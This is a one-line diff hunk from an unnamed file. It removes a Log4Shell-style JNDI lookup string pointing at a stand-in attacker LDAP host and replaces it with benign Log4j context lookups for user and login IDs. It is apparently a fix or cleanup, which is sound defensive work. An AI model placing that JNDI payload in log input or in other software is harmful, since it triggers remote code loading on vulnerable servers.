@@ -1,1 +1,1 @@
-${jndi:ldap://malicious.example.com/payload}
+${ctx:userID} ${ctx:loginID}
